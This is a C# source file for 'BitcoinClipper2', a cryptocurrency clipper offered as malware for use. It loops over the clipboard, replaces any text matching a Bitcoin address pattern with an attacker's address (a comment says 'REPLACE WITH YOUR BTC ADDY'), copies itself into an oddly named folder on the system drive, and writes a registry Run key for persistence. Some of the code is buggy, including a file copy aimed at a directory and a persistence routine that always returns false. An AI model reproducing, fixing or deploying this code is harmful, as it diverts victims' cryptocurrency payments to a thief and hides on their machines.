using System;
using System.IO;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;
using Microsoft.Win32;
using System.Windows.Forms;
using System.Text.RegularExpressions;

namespace BitcoinClipper2
{
    static class Program
    {
        private static string BTCAddress = "Clipper Is Working"; // REPLACE WITH YOUR BTC ADDY
        private static string BTCREGEX = "^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}$";

        [STAThread]
        public static void StartClipper()
        {
            while (1 < 2)
            {
                try
                {
                    if (Regex.IsMatch(Clipboard.GetText(TextDataFormat.Text), BTCREGEX))
                    {
                        Clipboard.Clear();
                        Clipboard.SetText(BTCAddress);
                    }
                    else
                    {
                        continue;
                    }
                } catch (Exception)
                {
                    continue;
                }
            }
        }
        [STAThread]
        public static bool CreateFolder()
        {
            string Dir = Environment.GetEnvironmentVariable("SYSTEMDRIVE") + @"\voENjsbuB";
            try
            {
                Directory.CreateDirectory(Dir);
                return true;            
            } catch (Exception)
            {
                return false;
            }
        }

        [STAThread]
        public static bool CreateShortcut(string PathTo)
        {
            try
            {
                Microsoft.Win32.RegistryKey key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                key.SetValue("BTC_Clipper", PathTo);
            } 
            catch (Exception)
            {
                return false;
            }
            return false;
        }

        [STAThread]
        public static bool Move()
        {
            string Dir = Environment.GetEnvironmentVariable("SYSTEMDRIVE") + @"\voENjsbuB";
            string CurrentDir = System.Reflection.Assembly.GetEntryAssembly().Location;
            if (CreateFolder())
            {
                if (Directory.Exists(Dir))
                {
                    File.Copy(CurrentDir, Dir);
                    try
                    {
                        if (Directory.Exists(CurrentDir))
                        {
                            if (Program.CreateShortcut(Dir))
                            {
                                return true;
                            }
                        } else
                        {
                            return false;
                        }
                        return false;
                    }
                    catch (Exception)
                    {
                        return false;
                    }
                }
                return false;
            }
            return false;
        }
        /// <summary>
        /// The main entry point for the application.
        /// </summary>
        [STAThread]
        static void Main()
        {
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            Application.Run(new Form1());
        }
    }
}
